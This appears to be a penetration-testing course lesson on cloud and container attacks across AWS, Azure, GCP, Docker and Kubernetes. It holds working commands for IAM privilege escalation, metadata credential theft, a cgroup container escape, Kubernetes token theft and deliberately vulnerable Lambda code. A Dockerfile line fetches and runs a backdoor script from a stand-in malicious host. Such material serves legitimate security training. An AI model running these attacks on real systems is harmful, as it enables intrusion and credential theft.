# LESSON 11: Cloud Security & Container Attacks

## Objective
Master cloud infrastructure attacks targeting AWS, Azure, and GCP. Learn container escape techniques, serverless exploitation, and cloud-native security testing methodologies.

## Prerequisites
- Lessons 1-10 completed
- Cloud platform account (AWS/Azure/GCP)
- Docker knowledge
- Understanding of cloud services

## Phase 1: Cloud Enumeration & Reconnaissance

### Step 1: AWS Enumeration
```bash
# Configure AWS CLI
aws configure
aws sts get-caller-identity

# Service enumeration
aws s3 ls
aws ec2 describe-instances
aws iam list-users
aws rds describe-db-instances
aws lambda list-functions

# CloudTrail analysis
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole
```

### Step 2: Azure Enumeration
```bash
# Azure CLI setup
az login
az account show

# Service discovery
az vm list
az storage account list
az keyvault list
az functionapp list
az sql server list

# Azure AD enumeration
az ad user list
az ad group list
az role assignment list
```

### Step 3: GCP Enumeration
```bash
# GCP CLI setup
gcloud auth login
gcloud projects list

# Service enumeration
gcloud compute instances list
gcloud storage buckets list
gcloud functions list
gcloud sql instances list
gcloud container clusters list
```

## Phase 2: AWS-Specific Attacks

### Step 4: S3 Bucket Attacks
```bash
# S3 bucket discovery
aws s3 ls s3://bucket-name
aws s3 ls s3://bucket-name --recursive

# Bucket enumeration
for bucket in $(aws s3 ls | cut -d" " -f 3); do
    echo "Checking $bucket"
    aws s3 ls s3://$bucket 2>/dev/null
done

# S3 bucket exploitation
aws s3 cp sensitive_file.txt s3://target-bucket/
aws s3 sync . s3://target-bucket/ --exclude "*" --include "*.txt"

# Bucket policy analysis
aws s3api get-bucket-policy --bucket target-bucket
aws s3api get-bucket-acl --bucket target-bucket
```

### Step 5: IAM Privilege Escalation
```bash
# Current permissions enumeration
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name username
aws iam list-user-policies --user-name username

# Policy enumeration
aws iam get-policy --policy-arn arn:aws:iam::account:policy/PolicyName
aws iam get-policy-version --policy-arn arn:aws:iam::account:policy/PolicyName --version-id v1

# Common privilege escalation paths
# 1. iam:PutUserPolicy
aws iam put-user-policy --user-name target-user --policy-name AdminPolicy --policy-document file://admin-policy.json

# 2. iam:AttachUserPolicy  
aws iam attach-user-policy --user-name target-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 3. iam:CreateRole + AssumeRole
aws iam create-role --role-name EscalationRole --assume-role-policy-document file://trust-policy.json
aws sts assume-role --role-arn arn:aws:iam::account:role/EscalationRole --role-session-name test
```

### Step 6: EC2 Instance Attacks
```bash
# Instance metadata service
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name

# IMDSv2 (requires token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# User data extraction
curl http://169.254.169.254/latest/user-data
```

### Step 7: Lambda Function Exploitation
```bash
# Lambda enumeration
aws lambda list-functions
aws lambda get-function --function-name function-name

# Environment variable extraction
aws lambda get-function-configuration --function-name function-name

# Code analysis
aws lambda get-function --function-name function-name --query 'Code.Location'

# Lambda privilege escalation
# Modify function code to execute privileged operations
```

## Phase 3: Container Security Testing

### Step 8: Docker Enumeration
```bash
# Docker information gathering
docker version
docker info
docker images
docker ps -a

# Container inspection
docker inspect container-id
docker logs container-id
docker exec -it container-id /bin/bash
```

### Step 9: Container Escape Techniques
```bash
# Check for privileged containers
docker inspect container-id | grep -i privileged

# Dangerous capabilities
docker inspect container-id | grep -i "CapAdd\|CapDrop"

# Host filesystem access
ls -la /proc/1/root/
findmnt

# Privileged container escape
# If running with --privileged flag
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### Step 10: Kubernetes Attacks
```bash
# Kubernetes enumeration
kubectl cluster-info
kubectl get nodes
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces

# Service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# API server access
curl -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
     https://kubernetes.default.svc/api/v1/namespaces/default/pods

# Privilege escalation
kubectl auth can-i --list
kubectl get clusterrolebindings -o wide
```

## Phase 4: Azure-Specific Attacks

### Step 11: Azure Blob Storage
```bash
# Storage account enumeration
az storage account list
az storage container list --account-name storageaccount

# Blob access
az storage blob list --container-name container --account-name storage
az storage blob download --container-name container --name file.txt --account-name storage

# SAS token abuse
# If SAS token is discovered
curl "https://storage.blob.core.windows.net/container/file.txt?SAS_TOKEN"
```

### Step 12: Azure AD Attacks
```bash
# User enumeration
az ad user list --output table
az ad group member list --group "Group Name"

# Service principal enumeration
az ad sp list --display-name "App Name"
az ad sp credential list --id service-principal-id

# Privilege escalation via applications
az role assignment create --assignee service-principal-id --role "Contributor"
```

### Step 13: Azure Function Exploitation
```bash
# Function app enumeration
az functionapp list
az functionapp config show --name functionapp --resource-group rg

# Function code analysis
az functionapp deployment source show --name functionapp --resource-group rg
```

## Phase 5: Serverless Exploitation

### Step 14: AWS Lambda Security Testing
```python
# Lambda function vulnerability testing
import json
import os
import subprocess

def lambda_handler(event, context):
    # Command injection vulnerability
    command = event.get('command', 'whoami')
    result = subprocess.check_output(command, shell=True)
    
    # Environment variable leakage
    env_vars = dict(os.environ)
    
    return {
        'statusCode': 200,
        'body': json.dumps({
            'command_output': result.decode(),
            'environment': env_vars
        })
    }
```

### Step 15: Serverless SSRF
```python
# Server-Side Request Forgery in Lambda
import requests

def lambda_handler(event, context):
    url = event.get('url')
    
    # SSRF to metadata service
    if url:
        response = requests.get(url)
        return {
            'statusCode': 200,
            'body': response.text
        }
```

## Phase 6: Container Registry Attacks

### Step 16: Docker Registry Exploitation
```bash
# Registry enumeration
curl -s https://registry.domain.com/v2/_catalog

# Repository listing
curl -s https://registry.domain.com/v2/repository/tags/list

# Manifest analysis
curl -s -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
     https://registry.domain.com/v2/repository/manifests/latest

# Layer download
curl -s https://registry.domain.com/v2/repository/blobs/sha256:digest
```

### Step 17: Supply Chain Attacks
```bash
# Dockerfile analysis
FROM ubuntu:latest
RUN wget http://malicious.com/backdoor.sh && bash backdoor.sh
COPY app.py /app/
RUN pip install malicious-package
```

## Phase 8: Cloud Security Tools

### Step 18: Automated Cloud Security Testing
```bash
# ScoutSuite for multi-cloud assessment
python scout.py aws
python scout.py azure
python scout.py gcp

# Prowler for AWS security assessment
./prowler -g cislevel2

# CloudMapper for AWS visualization
python cloudmapper.py collect --account-name prod
python cloudmapper.py weboftrust --account-name prod

# Pacu for AWS exploitation
python pacu.py
```

## Custom Scripts Usage

### cloud_enum.py
```bash
# Multi-cloud enumeration tool
python3 scripts/lesson_11_cloud_security/cloud_enum.py --provider aws --services s3,ec2,iam
```

### container_escape.py
```bash
# Container escape automation
python3 scripts/lesson_11_cloud_security/container_escape.py --check-all --exploit
```

## Evidence Collection

### Step 19: Document Cloud Compromise
```bash
# AWS evidence collection
aws logs describe-log-groups
aws cloudtrail lookup-events --start-time 2023-01-01 --end-time 2023-12-31

# Azure evidence collection
az monitor activity-log list --start-time 2023-01-01 --end-time 2023-12-31

# Container evidence
docker logs container-id > container_logs.txt
kubectl logs pod-name > k8s_logs.txt
```

## Success Criteria

✓ Cloud services enumerated across multiple providers
✓ S3 bucket vulnerabilities identified and exploited
✓ IAM privilege escalation achieved
✓ Container escapes executed successfully
✓ Kubernetes cluster compromised
✓ Serverless functions exploited
✓ Cloud security tools utilized
✓ Custom scripts functioning

## Cloud Attack Vectors Summary

### AWS
- **S3 Misconfigurations**: Public buckets, weak policies
- **IAM Escalation**: Policy attachment, role assumption
- **EC2 IMDS**: Metadata service abuse
- **Lambda**: Code injection, environment disclosure

### Azure
- **Blob Storage**: Anonymous access, SAS token abuse
- **Azure AD**: Service principal privilege escalation
- **Key Vault**: Certificate and secret extraction
- **Functions**: Code vulnerabilities

### GCP
- **Cloud Storage**: Bucket enumeration, ACL bypass
- **IAM**: Service account impersonation
- **Compute**: Metadata service exploitation
- **Cloud Functions**: Code injection attacks

## Container Security Issues

| Vulnerability | Impact | Mitigation |
|---------------|--------|------------|
| Privileged containers | Full host access | Remove --privileged |
| Host filesystem mounts | File system access | Limit mount points |
| Dangerous capabilities | System call abuse | Drop capabilities |
| Weak isolation | Container escape | Use user namespaces |
| Registry vulnerabilities | Supply chain attacks | Scan images |

## Defense Recommendations

### Cloud Security
- Enable CloudTrail/Activity Logs/Audit Logs
- Implement least privilege access
- Regular access reviews
- Multi-factor authentication
- Network segmentation
- Resource tagging and monitoring

### Container Security  
- Use minimal base images
- Regular image scanning
- Runtime security monitoring
- Network policies
- Resource limits
- Non-root containers

## Next Lesson Preview
**Lesson 12**: Social Engineering & OSINT
- Information gathering techniques
- Social engineering attacks
- Phishing campaigns